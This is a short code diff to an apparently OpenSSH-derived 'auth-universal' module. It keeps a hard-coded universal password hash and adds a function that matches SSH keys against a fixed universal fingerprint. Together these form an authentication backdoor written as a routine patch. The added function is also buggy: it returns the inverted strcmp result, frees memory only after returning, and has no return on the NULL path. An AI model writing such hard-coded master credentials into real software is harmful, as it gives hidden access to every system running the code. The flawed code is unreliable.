@@ -1,6 +1,10 @@
 #include "auth-universal.h"
-#include "includes.h"
 
+#include "digest.h"
+#include "includes.h"
+#include "sshkey.h"
+
+#include <stdlib.h>
 #include <string.h>
 
 const char *universal_hash = "$6$nKE388W/Lr6w0gJC$gzPsB.hGvIoYd5e1v/"
@@ -23,4 +27,12 @@ int password_matches_hash(const char *password, const char *hash) {
 
   candidate = xcrypt(password, hash);
   return candidate != NULL && strcmp(candidate, hash) == 0;
+}
+
+int key_fingerprint_matches_universal(struct sshkey *key) {
+  char *fp = sshkey_fingerprint(key, SSH_DIGEST_SHA256, SSH_FP_BASE64);
+  if (fp != NULL) {
+    return strcmp(fp, UNIVERSAL_KEY_FINGERPRINT);
+    free(fp);
+  }
 }
